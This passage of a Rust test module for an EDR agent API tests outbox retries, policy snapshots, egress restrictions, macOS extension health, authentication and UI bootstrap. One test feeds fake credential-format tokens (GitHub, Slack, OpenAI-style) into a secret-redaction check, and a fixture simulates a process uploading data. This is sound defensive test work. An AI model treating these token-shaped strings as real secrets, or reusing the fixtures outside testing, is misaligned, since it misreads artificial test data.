                    chrono::Utc::now() - chrono::Duration::seconds(1),
                ))
                .unwrap_or_else(|err| {
                    panic!("failed to append fleet hunt event outbox entry: {err}")
                });
        }
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/fleet-hunt-events/retry",
                post(agent_edr_fleet_hunt_events_retry),
            )
            .with_state(Arc::new(state));
        let body = serde_json::json!({
            "force": true,
            "limit": 5
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/fleet-hunt-events/retry")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|err| panic!("failed to build fleet hunt retry request: {err}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|err| panic!("fleet hunt retry request failed: {err}"));
        assert_eq!(response.status(), StatusCode::SERVICE_UNAVAILABLE);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|err| panic!("failed to read fleet hunt retry response: {err}"));
        let body = std::str::from_utf8(&bytes)
            .unwrap_or_else(|err| panic!("fleet hunt retry response was not utf8: {err}"));
        assert!(body.contains("NATS is not connected"));

        let persisted = read_fleet_hunt_event_outbox(&outbox_path).unwrap_or_else(|err| {
            panic!("failed to read fleet hunt outbox after failed retry: {err}")
        });
        assert_eq!(persisted.len(), 1);
        assert_eq!(persisted[0].outbox_id, "0xfleet-retry-no-nats");
        assert_eq!(persisted[0].attempt_count, 1);
        assert_eq!(persisted[0].last_error_hash, None);
    }

    #[tokio::test]
    async fn fleet_hunt_event_retry_drains_due_queue_with_publisher() {
        let publisher = Arc::new(TestFleetHuntPublisher::new("endpoint-agent-archive-1"));
        let mut state = test_state();
        let outbox_path = test_fleet_hunt_event_outbox_path();
        state.fleet_hunt_publisher = Some(publisher.clone());
        state.edr_fleet_hunt_event_outbox = Arc::new(Mutex::new(
            EndpointFleetHuntEventOutbox::open(&outbox_path)
                .unwrap_or_else(|err| panic!("failed to open fleet hunt event outbox: {err}")),
        ));
        {
            let mut outbox = state.edr_fleet_hunt_event_outbox.lock().await;
            let now = chrono::Utc::now();
            outbox
                .append(test_fleet_hunt_event_outbox_entry(
                    "0xfleet-retry-due",
                    "event-retry-due",
                    "endpoint-evidence-bundle-archive:due:0xddd",
                    now - chrono::Duration::seconds(1),
                ))
                .unwrap_or_else(|err| {
                    panic!("failed to append due fleet hunt outbox entry: {err}")
                });
            outbox
                .append(test_fleet_hunt_event_outbox_entry(
                    "0xfleet-retry-future",
                    "event-retry-future",
                    "endpoint-evidence-bundle-archive:future:0xeee",
                    now + chrono::Duration::seconds(300),
                ))
                .unwrap_or_else(|err| {
                    panic!("failed to append future fleet hunt outbox entry: {err}")
                });
        }
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/fleet-hunt-events/retry",
                post(agent_edr_fleet_hunt_events_retry),
            )
            .with_state(Arc::new(state));
        let body = serde_json::json!({
            "force": false,
            "limit": 5
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/fleet-hunt-events/retry")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|err| panic!("failed to build fleet hunt drain request: {err}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|err| panic!("fleet hunt drain request failed: {err}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|err| panic!("failed to read fleet hunt drain response: {err}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|err| panic!("failed to decode fleet hunt drain response: {err}"));
        assert_eq!(payload["attempted"], 1);
        assert_eq!(payload["delivered"], 1);
        assert_eq!(payload["failed"], 0);
        assert_eq!(payload["skipped"], 1);
        assert_eq!(payload["pending"], 1);
        assert_eq!(payload["attempts"][0]["outboxId"], "0xfleet-retry-due");

        let published = publisher.published_events().await;
        assert_eq!(published.len(), 1);
        assert_eq!(published[0]["eventId"], "event-retry-due");
        let persisted = read_fleet_hunt_event_outbox(&outbox_path)
            .unwrap_or_else(|err| panic!("failed to read fleet hunt outbox after drain: {err}"));
        assert_eq!(persisted.len(), 1);
        assert_eq!(persisted[0].outbox_id, "0xfleet-retry-future");
    }

    #[tokio::test]
    async fn fleet_sync_loop_drains_due_fleet_hunt_outbox_on_startup() {
        let publisher = Arc::new(TestFleetHuntPublisher::new("endpoint-agent-archive-1"));
        let mut state = test_state();
        state.fleet_hunt_publisher = Some(publisher.clone());
        state.edr_fleet_hunt_event_outbox =
            Arc::new(Mutex::new(EndpointFleetHuntEventOutbox::transient()));
        {
            let mut outbox = state.edr_fleet_hunt_event_outbox.lock().await;
            outbox
                .append(test_fleet_hunt_event_outbox_entry(
                    "0xfleet-sync-due",
                    "event-sync-due",
                    "endpoint-evidence-bundle-archive:sync:0xfff",
                    chrono::Utc::now() - chrono::Duration::seconds(1),
                ))
                .unwrap_or_else(|err| panic!("failed to append sync outbox entry: {err}"));
        }
        let state = Arc::new(state);
        let (shutdown_tx, mut shutdown_rx) = broadcast::channel(1);
        let sync_state = state.clone();
        let sync_task = tokio::spawn(async move {
            fleet_agent_secret_touch_sync_loop(sync_state, &mut shutdown_rx).await;
        });

        tokio::time::timeout(Duration::from_secs(2), async {
            loop {
                if state
                    .edr_fleet_hunt_event_outbox
                    .lock()
                    .await
                    .pending_count()
                    == 0
                {
                    break;
                }
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        })
        .await
        .unwrap_or_else(|_| panic!("timed out waiting for fleet hunt outbox startup drain"));

        let published = publisher.published_events().await;
        assert_eq!(published.len(), 1);
        assert_eq!(published[0]["eventId"], "event-sync-due");
        let _ = shutdown_tx.send(());
        tokio::time::timeout(Duration::from_secs(1), sync_task)
            .await
            .unwrap_or_else(|_| panic!("fleet sync loop did not shut down"))
            .unwrap_or_else(|err| panic!("fleet sync loop task failed: {err}"));
    }

    fn test_staged_detection_path() -> PathBuf {
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-agent-api-test-staged-detections-{}-{counter}.jsonl",
            std::process::id()
        ))
    }

    fn test_policy_delta_dir() -> PathBuf {
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-agent-api-test-policy-deltas-{}-{counter}",
            std::process::id()
        ))
    }

    fn test_network_extension_egress_policy_path() -> PathBuf {
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-agent-api-test-ne-egress-policy-{}-{counter}.json",
            std::process::id()
        ))
    }

    fn test_quarantine_dir() -> PathBuf {
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-agent-api-test-quarantine-{}-{counter}",
            std::process::id()
        ))
    }

    #[test]
    fn endpoint_policy_snapshot_prefers_explicit_policy_epoch() {
        let policy_path = test_policy_path();
        std::fs::write(
            &policy_path,
            "version: explicit-epoch\npolicy:\n  epoch: 4242\n",
        )
        .unwrap_or_else(|err| panic!("failed to write explicit epoch policy: {err}"));
        let settings = Settings {
            policy_path: policy_path.clone(),
            ..Settings::default()
        };

        let snapshot = endpoint_policy_snapshot_from_settings(&settings)
            .unwrap_or_else(|err| panic!("failed to build policy snapshot: {err}"));
        assert_eq!(snapshot.policy_version, "explicit-epoch");
        assert_eq!(snapshot.policy_epoch, 4242);

        let _ = std::fs::remove_file(policy_path);
    }

    #[test]
    fn endpoint_policy_snapshot_accepts_bundle_policy_epoch_string() {
        let policy_path = test_policy_path();
        std::fs::write(
            &policy_path,
            "version: bundle-epoch\nbundle:\n  policyEpoch: \"5150\"\n",
        )
        .unwrap_or_else(|err| panic!("failed to write bundle epoch policy: {err}"));
        let settings = Settings {
            policy_path: policy_path.clone(),
            ..Settings::default()
        };

        let snapshot = endpoint_policy_snapshot_from_settings(&settings)
            .unwrap_or_else(|err| panic!("failed to build policy snapshot: {err}"));
        assert_eq!(snapshot.policy_version, "bundle-epoch");
        assert_eq!(snapshot.policy_epoch, 5150);

        let _ = std::fs::remove_file(policy_path);
    }

    #[test]
    fn proposed_policy_snapshot_requires_explicit_policy_epoch() {
        let err =
            endpoint_policy_snapshot_from_memory_policy_bytes(b"version: no-epoch\n").unwrap_err();
        assert!(
            err.to_string().contains("policy_epoch"),
            "unexpected proposed policy snapshot error: {err}"
        );
        let snapshot = endpoint_policy_snapshot_from_memory_policy_bytes(
            b"version: proposed-epoch\npolicy_epoch: 6161\n",
        )
        .unwrap_or_else(|err| panic!("failed to build proposed policy snapshot: {err}"));
        assert_eq!(snapshot.policy_version, "proposed-epoch");
        assert_eq!(snapshot.policy_epoch, 6161);
    }

    fn read_json_file(path: &FsPath) -> serde_json::Value {
        let contents = std::fs::read_to_string(path)
            .unwrap_or_else(|err| panic!("failed to read JSON file {}: {err}", path.display()));
        serde_json::from_str(&contents)
            .unwrap_or_else(|err| panic!("failed to decode JSON file {}: {err}", path.display()))
    }

    #[test]
    fn endpoint_egress_restriction_artifacts_reject_unknown_fields() {
        let now = chrono::Utc::now();
        let restriction = EndpointEgressRestriction {
            restriction_id: "restriction-strict-egress".to_string(),
            execution_id: "execution-strict-egress".to_string(),
            action_id: "action-strict-egress".to_string(),
            graph_slice_id: "graph-strict-egress".to_string(),
            rollback_ref: "rollback-strict-egress".to_string(),
            target: "strict-egress.example.invalid:443".to_string(),
            target_hash: sha256(b"strict-egress.example.invalid:443").to_hex_prefixed(),
            active: true,
            created_at: now,
            expires_at: now + chrono::Duration::minutes(10),
            updated_at: now,
        };

        let mut restriction_value = serde_json::to_value(&restriction)
            .unwrap_or_else(|err| panic!("failed to encode egress restriction: {err}"));
        restriction_value["shadowActive"] =
            serde_json::Value::String("must not be ignored".to_string());
        assert_unknown_field_rejected::<EndpointEgressRestriction>(
            restriction_value.clone(),
            "shadowActive",
        );

        let ledger_path = std::env::temp_dir().join(format!(
            "clawdstrike-agent-api-test-egress-restrictions-{}-{}.jsonl",
            std::process::id(),
            TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed)
        ));
        write_jsonl_value(&ledger_path, &restriction_value);
        assert_anyhow_error_mentions_unknown_field(
            read_egress_restriction_ledger(&ledger_path).unwrap_err(),
            "shadowActive",
        );

        let snapshot = NetworkExtensionEgressPolicySnapshot {
            schema_version: EDR_NETWORK_EXTENSION_EGRESS_POLICY_SCHEMA_VERSION,
            generated_at: now,
            restrictions: vec![restriction],
        };
        let mut snapshot_value = serde_json::to_value(&snapshot)
            .unwrap_or_else(|err| panic!("failed to encode egress snapshot: {err}"));
        snapshot_value["shadowProviderState"] =
            serde_json::Value::String("must not be ignored".to_string());
        assert_unknown_field_rejected::<NetworkExtensionEgressPolicySnapshot>(
            snapshot_value,
            "shadowProviderState",
        );

        let mut nested_snapshot_value = serde_json::to_value(&snapshot)
            .unwrap_or_else(|err| panic!("failed to encode nested egress snapshot: {err}"));
        nested_snapshot_value["restrictions"][0]["shadowTarget"] =
            serde_json::Value::String("must not be ignored".to_string());
        assert_unknown_field_rejected::<NetworkExtensionEgressPolicySnapshot>(
            nested_snapshot_value,
            "shadowTarget",
        );

        let _ = std::fs::remove_file(ledger_path);
    }

    #[tokio::test]
    async fn network_extension_policy_sync_requests_provider_reload() {
        let state = Arc::new(test_state());
        let (reload_tx, mut reload_rx) =
            tokio::sync::mpsc::channel::<crate::macos::host::MacosNetworkExtensionReloadRequest>(1);
        state
            .macos_host
            .install_network_extension_reload_channel(reload_tx)
            .await;

        let now = chrono::Utc::now();
        {
            let mut ledger = state.edr_egress_restriction_ledger.lock().await;
            ledger
                .append(&[EndpointEgressRestriction {
                    restriction_id: "restriction-sync-reload".to_string(),
                    execution_id: "execution-sync-reload".to_string(),
                    action_id: "action-sync-reload".to_string(),
                    graph_slice_id: "graph-sync-reload".to_string(),
                    rollback_ref: "rollback-sync-reload".to_string(),
                    target: "sync-reload.example.invalid:443".to_string(),
                    target_hash: sha256(b"sync-reload.example.invalid:443").to_hex_prefixed(),
                    active: true,
                    created_at: now,
                    expires_at: now + chrono::Duration::minutes(10),
                    updated_at: now,
                }])
                .unwrap_or_else(|err| panic!("failed to append sync reload restriction: {err}"));
        }

        let sync_state = state.clone();
        let sync_task = tokio::spawn(async move {
            sync_edr_network_extension_egress_policy(&sync_state, now).await
        });

        let request = reload_rx
            .recv()
            .await
            .unwrap_or_else(|| panic!("missing NetworkExtension reload request"));
        assert_eq!(
            request.policy_snapshot_path,
            *state.edr_network_extension_egress_policy_path
        );
        assert_eq!(request.generation, now.timestamp_millis() as u64);
        assert_eq!(
            request.timeout_duration,
            Duration::from_millis(EDR_DEFAULT_PROVIDER_ACK_TIMEOUT_MS)
        );
        request
            .reply_tx
            .send(Ok(crate::macos::host::MacosNetworkExtensionReloadResult {
                requested: true,
                saved: true,
                request_id: "test-sync-reload".to_string(),
                policy_snapshot_path: state
                    .edr_network_extension_egress_policy_path
                    .display()
                    .to_string(),
                generation: now.timestamp_millis() as u64,
            }))
            .unwrap_or_else(|_| panic!("failed to send NetworkExtension reload response"));

        sync_task
            .await
            .unwrap_or_else(|err| panic!("sync task panicked: {err}"))
            .unwrap_or_else(|err| panic!("sync failed: {err:?}"));

        let snapshot = read_json_file(state.edr_network_extension_egress_policy_path.as_ref());
        assert_eq!(
            snapshot["restrictions"][0]["target"],
            "sync-reload.example.invalid:443"
        );
    }

    fn test_collect_evidence_execution(
        process_guid: &str,
        host: &str,
        ttl_seconds: u64,
        reason: &str,
    ) -> (EndpointResponseExecutionReport, CausalGraph) {
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some(process_guid.to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: host.to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some(format!("https://{host}/upload")),
            },
            ..EndpointObservation::default()
        };
        let mut recorder = CausalGraphRecorder::new();
        recorder.record_observation(&observation);
        let root_node_id = observation.process.stable_node_id();
        let subgraph = recorder
            .graph()
            .causal_subgraph_from(&root_node_id, 3)
            .unwrap_or_else(|| panic!("missing test response execution subgraph"));
        let plan = EndpointResponsePlan::collect_evidence_execution(
            &root_node_id,
            &subgraph,
            ttl_seconds,
            reason,
        );
        let execution = EndpointResponseExecutionReport::collect_evidence(&plan, &subgraph)
            .unwrap_or_else(|err| panic!("failed to build collect evidence report: {err}"));
        (execution, subgraph)
    }

    #[test]
    fn policy_version_cache_marks_refresh_in_flight_once_per_interval() {
        let mut cache = PolicyVersionCache::default();
        let now = std::time::Instant::now();
        assert!(cache.mark_refresh_started_if_due(now));
        assert!(!cache.mark_refresh_started_if_due(now));
    }

    #[test]
    fn policy_version_cache_finish_refresh_updates_value_and_clears_in_flight() {
        let mut cache = PolicyVersionCache::default();
        let started = std::time::Instant::now();
        assert!(cache.mark_refresh_started_if_due(started));
        assert!(cache.refresh_in_flight);
        assert_eq!(cache.refresh_started_at, Some(started));

        cache.finish_refresh(Some("42".to_string()), started);
        assert_eq!(cache.value.as_deref(), Some("42"));
        assert!(!cache.refresh_in_flight);
        assert!(cache.refresh_started_at.is_none());
    }

    #[test]
    fn policy_version_cache_recovers_when_refresh_task_stalls() {
        let mut cache = PolicyVersionCache::default();
        let started = std::time::Instant::now();
        assert!(cache.mark_refresh_started_if_due(started));
        assert!(!cache.mark_refresh_started_if_due(started + POLICY_VERSION_CACHE_REFRESH_INTERVAL));

        let after_timeout =
            started + POLICY_VERSION_REFRESH_IN_FLIGHT_TIMEOUT + Duration::from_millis(1);
        assert!(cache.mark_refresh_started_if_due(after_timeout));
        assert!(cache.refresh_in_flight);
    }

    #[test]
    fn macos_host_health_status_is_pending_for_unknown_state() {
        assert_eq!(
            macos_host_health_status(&CombinedSystemExtensionStatus::default()),
            "pending"
        );
    }

    #[test]
    fn macos_host_health_status_is_degraded_for_blocked_or_missing_extensions() {
        let blocked = CombinedSystemExtensionStatus {
            approval: SystemExtensionApproval::ApprovalBlocked,
            ..CombinedSystemExtensionStatus::default()
        };
        assert_eq!(macos_host_health_status(&blocked), "degraded");

        let not_installed = CombinedSystemExtensionStatus {
            install_state: SystemExtensionInstallState::NotInstalled,
            ..CombinedSystemExtensionStatus::default()
        };
        assert_eq!(macos_host_health_status(&not_installed), "degraded");
    }

    #[test]
    fn macos_host_health_status_is_pending_for_inactive_extensions() {
        let inactive = CombinedSystemExtensionStatus {
            install_state: SystemExtensionInstallState::Installed,
            approval: SystemExtensionApproval::Approved,
            endpoint_security: crate::macos::status::ProviderStatus::inactive(),
            network_extension: crate::macos::status::ProviderStatus::inactive(),
            ..CombinedSystemExtensionStatus::default()
        };
        assert_eq!(macos_host_health_status(&inactive), "pending");
    }

    #[test]
    fn macos_host_health_status_is_ok_for_fully_active_extensions() {
        let active = CombinedSystemExtensionStatus {
            install_state: SystemExtensionInstallState::Installed,
            approval: SystemExtensionApproval::Approved,
            endpoint_security: crate::macos::status::ProviderStatus {
                runtime: ProviderRuntimeState::Active,
                ..crate::macos::status::ProviderStatus::unknown()
            },
            network_extension: crate::macos::status::ProviderStatus {
                runtime: ProviderRuntimeState::Active,
                ..crate::macos::status::ProviderStatus::unknown()
            },
            ..CombinedSystemExtensionStatus::default()
        };

        assert_eq!(macos_host_health_status(&active), "ok");
    }

    #[test]
    fn endpoint_sensor_state_marks_unknown_macos_providers_degraded() {
        let sensor_state =
            endpoint_sensor_state_from_macos_host(&CombinedSystemExtensionStatus::default());
        let endpoint_security = sensor_state
            .providers
            .iter()
            .find(|provider| provider.provider_id == "macos.endpoint_security")
            .unwrap_or_else(|| panic!("missing endpoint security provider state"));

        assert!(!endpoint_security.installed);
        assert!(!endpoint_security.active);
        assert!(!endpoint_security.healthy);
        assert!(endpoint_security.degraded);
        assert!(endpoint_security
            .degradation_reasons
            .contains(&"provider runtime unknown".to_string()));
    }

    #[test]
    fn endpoint_sensor_state_marks_loss_deadline_and_fda_evidence_degraded() {
        let mut counters = BTreeMap::new();
        counters.insert("dropped_event_count".to_string(), 2);
        counters.insert("deadline_miss_count".to_string(), 1);
        let status = CombinedSystemExtensionStatus {
            install_state: SystemExtensionInstallState::Installed,
            approval: SystemExtensionApproval::Approved,
            endpoint_security: crate::macos::status::ProviderStatus {
                runtime: ProviderRuntimeState::Active,
                counters,
                evidence_paths: vec![crate::macos::status::EvidenceArtifact {
                    kind: "missing_full_disk_access".to_string(),
                    path: "/tmp/clawdstrike/missing-fda.json".to_string(),
                    detail: "EndpointSecurity lacks Full Disk Access".to_string(),
                }],
                ..crate::macos::status::ProviderStatus::unknown()
            },
            network_extension: crate::macos::status::ProviderStatus {
                runtime: ProviderRuntimeState::Active,
                ..crate::macos::status::ProviderStatus::unknown()
            },
            ..CombinedSystemExtensionStatus::default()
        };

        let sensor_state = endpoint_sensor_state_from_macos_host(&status);
        let endpoint_security = sensor_state
            .providers
            .iter()
            .find(|provider| provider.provider_id == "macos.endpoint_security")
            .unwrap_or_else(|| panic!("missing endpoint security provider state"));

        assert!(endpoint_security.installed);
        assert!(endpoint_security.active);
        assert!(!endpoint_security.healthy);
        assert!(endpoint_security.degraded);
        assert_eq!(endpoint_security.dropped_event_count, 2);
        assert_eq!(endpoint_security.deadline_miss_count, 1);
        assert_eq!(endpoint_security.full_disk_access, Some(false));
        assert!(endpoint_security
            .degradation_reasons
            .contains(&"provider dropped enforcement events".to_string()));
        assert!(endpoint_security
            .degradation_reasons
            .contains(&"provider authorization deadline misses".to_string()));
        assert!(endpoint_security
            .degradation_reasons
            .contains(&"missing_full_disk_access".to_string()));
    }

    #[test]
    fn endpoint_sensor_state_redacts_secret_like_provider_degradation_reasons() {
        let status = CombinedSystemExtensionStatus {
            install_state: SystemExtensionInstallState::Installed,
            approval: SystemExtensionApproval::Approved,
            endpoint_security: crate::macos::status::ProviderStatus {
                runtime: ProviderRuntimeState::Degraded {
                    reason: "runtime failure ghs_1234567890abcdef1234".to_string(),
                },
                last_error: Some("last provider error xoxb-1234567890abcdef1234567890".to_string()),
                provider_state: Some(crate::macos::status::ProviderAttestationState {
                    provider: "endpoint_security".to_string(),
                    installed: true,
                    approval_status: crate::macos::status::ProviderApprovalStatus::Approved,
                    active: true,
                    healthy: false,
                    availability: crate::macos::status::ProviderAvailability::Degraded,
                    degraded_reasons: vec![
                        "attestation leaked sk-abcdefghijklmnopqrstuvwxyz".to_string()
                    ],
                    last_healthy_timestamp: None,
                }),
                ..crate::macos::status::ProviderStatus::unknown()
            },
            network_extension: crate::macos::status::ProviderStatus {
                runtime: ProviderRuntimeState::Active,
                ..crate::macos::status::ProviderStatus::unknown()
            },
            ..CombinedSystemExtensionStatus::default()
        };

        let sensor_state = endpoint_sensor_state_from_macos_host(&status);
        let endpoint_security = sensor_state
            .providers
            .iter()
            .find(|provider| provider.provider_id == "macos.endpoint_security")
            .unwrap_or_else(|| panic!("missing endpoint security provider state"));
        let reasons = endpoint_security.degradation_reasons.join("\n");

        assert!(endpoint_security.degraded);
        assert!(reasons.contains("[REDACTED]"));
        assert!(!reasons.contains("ghs_1234567890abcdef1234"));
        assert!(!reasons.contains("xoxb-1234567890abcdef1234567890"));
        assert!(!reasons.contains("sk-abcdefghijklmnopqrstuvwxyz"));
    }

    #[test]
    fn agent_health_status_preserves_non_macos_ok_fallback() {
        let status = CombinedSystemExtensionStatus::default();
        if cfg!(target_os = "macos") {
            assert_eq!(agent_health_status(&status), "pending");
        } else {
            assert_eq!(agent_health_status(&status), "ok");
        }
    }

    #[test]
    fn auth_accepts_bearer_token() {
        let state = test_state();
        let mut headers = HeaderMap::new();
        headers.insert(
            "authorization",
            "Bearer test-token"
                .parse()
                .unwrap_or_else(|_| panic!("failed to build authorization header")),
        );

        let result = require_auth(&headers, &state);
        assert!(result.is_ok());
    }

    #[test]
    fn auth_rejects_missing_headers() {
        let state = test_state();
        let headers = HeaderMap::new();
        let result = require_auth(&headers, &state);
        assert!(result.is_err());
    }

    #[test]
    fn auth_rejects_invalid_tokens() {
        let state = test_state();
        let mut headers = HeaderMap::new();
        headers.insert(
            "authorization",
            "Bearer wrong-token"
                .parse()
                .unwrap_or_else(|_| panic!("failed to build authorization header")),
        );

        let result = require_auth(&headers, &state);
        assert!(result.is_err());
    }

    #[test]
    fn auth_accepts_cookie_token_without_authorization_header() {
        let state = test_state();
        let mut headers = HeaderMap::new();
        headers.insert(
            COOKIE,
            format!("{}={}", AGENT_AUTH_COOKIE_NAME, current_auth_token(&state))
                .parse()
                .unwrap_or_else(|_| panic!("failed to build cookie header")),
        );

        let result = require_auth(&headers, &state);
        assert!(result.is_ok());
    }

    #[test]
    fn auth_allows_cookie_fallback_when_authorization_is_invalid() {
        let state = test_state();
        let mut headers = HeaderMap::new();
        headers.insert(
            AUTHORIZATION,
            "Bearer wrong-token"
                .parse()
                .unwrap_or_else(|_| panic!("failed to build authorization header")),
        );
        headers.insert(
            COOKIE,
            format!("{}={}", AGENT_AUTH_COOKIE_NAME, current_auth_token(&state))
                .parse()
                .unwrap_or_else(|_| panic!("failed to build cookie header")),
        );

        let result = require_auth(&headers, &state);
        assert!(result.is_ok());
    }

    #[test]
    fn local_host_header_accepts_ipv6_loopback_with_port() {
        let mut headers = HeaderMap::new();
        headers.insert(
            "host",
            "[::1]:9878"
                .parse()
                .unwrap_or_else(|_| panic!("failed to build host header")),
        );
        assert!(is_local_host_header(&headers));
    }

    #[test]
    fn local_host_header_rejects_public_host() {
        let mut headers = HeaderMap::new();
        headers.insert(
            "host",
            "example.com:9878"
                .parse()
                .unwrap_or_else(|_| panic!("failed to build host header")),
        );
        assert!(!is_local_host_header(&headers));
    }

    #[test]
    fn local_host_header_rejects_missing_header() {
        let headers = HeaderMap::new();
        assert!(!is_local_host_header(&headers));
    }

    #[test]
    fn map_openclaw_error_classifies_dns_resolution_failure_as_bad_request() {
        let err = anyhow::anyhow!("failed to resolve gateway host bad.example:443");
        let (status, message) = map_openclaw_error(err);
        assert_eq!(status, StatusCode::BAD_REQUEST);
        assert!(message.contains("failed to resolve gateway host"));
    }

    #[test]
    fn request_is_secure_uri_accepts_https_scheme_without_proxy_header() {
        let headers = HeaderMap::new();
        let uri = "https://localhost/ui/bootstrap"
            .parse::<Uri>()
            .unwrap_or_else(|_| panic!("failed to parse https uri for secure check"));
        assert!(request_is_secure_uri(&headers, &uri));
    }

    #[test]
    fn request_is_secure_uri_rejects_forwarded_proto_for_non_local_host() {
        let mut headers = HeaderMap::new();
        headers.insert(
            "host",
            "example.com:9878"
                .parse()
                .unwrap_or_else(|_| panic!("failed to build host header")),
        );
        headers.insert(
            "x-forwarded-proto",
            "https"
                .parse()
                .unwrap_or_else(|_| panic!("failed to build x-forwarded-proto header")),
        );
        let uri = "/ui/bootstrap"
            .parse::<Uri>()
            .unwrap_or_else(|_| panic!("failed to parse relative uri for secure check"));
        assert!(!request_is_secure_uri(&headers, &uri));
    }

    #[test]
    fn request_is_secure_uri_accepts_forwarded_proto_for_local_host() {
        let mut headers = HeaderMap::new();
        headers.insert(
            "host",
            "127.0.0.1:9878"
                .parse()
                .unwrap_or_else(|_| panic!("failed to build host header")),
        );
        headers.insert(
            "x-forwarded-proto",
            "https"
                .parse()
                .unwrap_or_else(|_| panic!("failed to build x-forwarded-proto header")),
        );
        let uri = "/ui/bootstrap"
            .parse::<Uri>()
            .unwrap_or_else(|_| panic!("failed to parse relative uri for secure check"));
        assert!(request_is_secure_uri(&headers, &uri));
    }

    #[tokio::test]
    async fn ui_routes_require_auth_and_bootstrap_with_one_time_code() {
        let state = Arc::new(test_state());
        let ui_router = Router::new().route("/", get(|| async { "ok" })).layer(
            axum::middleware::from_fn_with_state(state.clone(), attach_ui_auth_cookie),
        );
        let app = Router::new()
            .route("/api/v1/ui/bootstrap/start", post(start_ui_bootstrap))
            .route("/ui/bootstrap", post(ui_bootstrap_verify))
            .nest("/ui", ui_router)
            .with_state(Arc::clone(&state));

        let unauth_req = axum::http::Request::builder()
            .method("GET")
            .uri("/ui")
            .header("host", "127.0.0.1:9878")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build unauth request: {e}"));
        let unauth_resp = app
            .clone()
            .oneshot(unauth_req)
            .await
            .unwrap_or_else(|e| panic!("unauth request failed: {e}"));
        assert_eq!(unauth_resp.status(), StatusCode::UNAUTHORIZED);
        assert!(unauth_resp.headers().get(SET_COOKIE).is_none());

        let deprecated_query_req = axum::http::Request::builder()
            .method("GET")
            .uri("/ui?agent_token=test-token")
            .header("host", "127.0.0.1:9878")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build deprecated query request: {e}"));
        let deprecated_query_resp = app
            .clone()
            .oneshot(deprecated_query_req)
            .await
            .unwrap_or_else(|e| panic!("deprecated query request failed: {e}"));
        assert_eq!(deprecated_query_resp.status(), StatusCode::BAD_REQUEST);

        let start_req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/ui/bootstrap/start")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(
                r#"{"next_path":"/ui/settings/siem"}"#,
            ))
            .unwrap_or_else(|e| panic!("failed to build bootstrap start request: {e}"));
        let start_resp = app
            .clone()
            .oneshot(start_req)
            .await
            .unwrap_or_else(|e| panic!("bootstrap start request failed: {e}"));
        assert_eq!(start_resp.status(), StatusCode::OK);
        let start_bytes = axum::body::to_bytes(start_resp.into_body(), 64 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read bootstrap start body: {e}"));
        let payload: UiBootstrapStartResponse = serde_json::from_slice(&start_bytes)
            .unwrap_or_else(|e| panic!("failed to decode bootstrap start payload: {e}"));

        let verify_body = format!(
            "session_id={}&user_code={}",
            payload.session_id, payload.user_code
        );
        let verify_req = axum::http::Request::builder()
            .method("POST")
            .uri("/ui/bootstrap")
            .header("host", "127.0.0.1:9878")
            .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
            .body(axum::body::Body::from(verify_body))
            .unwrap_or_else(|e| panic!("failed to build bootstrap verify request: {e}"));
        let bootstrap_resp = app
            .clone()
            .oneshot(verify_req)
            .await
            .unwrap_or_else(|e| panic!("bootstrap verify request failed: {e}"));
        assert_eq!(bootstrap_resp.status(), StatusCode::SEE_OTHER);
        assert_eq!(
            bootstrap_resp
                .headers()
                .get(LOCATION)
                .and_then(|value| value.to_str().ok()),
            Some("/ui/settings/siem")
        );
        assert!(bootstrap_resp.headers().get(SET_COOKIE).is_some());

        let cookie_req = axum::http::Request::builder()
            .method("GET")
            .uri("/ui")
            .header("host", "127.0.0.1:9878")
            .header(COOKIE, format!("{AGENT_AUTH_COOKIE_NAME}=test-token"))
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build cookie request: {e}"));
        let cookie_resp = app
            .oneshot(cookie_req)
            .await
            .unwrap_or_else(|e| panic!("cookie request failed: {e}"));
        assert_eq!(cookie_resp.status(), StatusCode::OK);
    }

    #[test]
    fn approval_submission_limiter_enforces_burst_limit() {
        let mut limiter = ApprovalSubmissionLimiter::default();
        let now = Instant::now();
        for _ in 0..APPROVAL_RATE_LIMIT_BURST {
            assert!(limiter.allow_now(now).is_ok());
        }
        assert!(limiter.allow_now(now).is_err());
    }

    #[tokio::test]
    async fn agent_health_route_requires_auth() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route("/api/v1/agent/health", get(agent_health))
            .with_state(state);

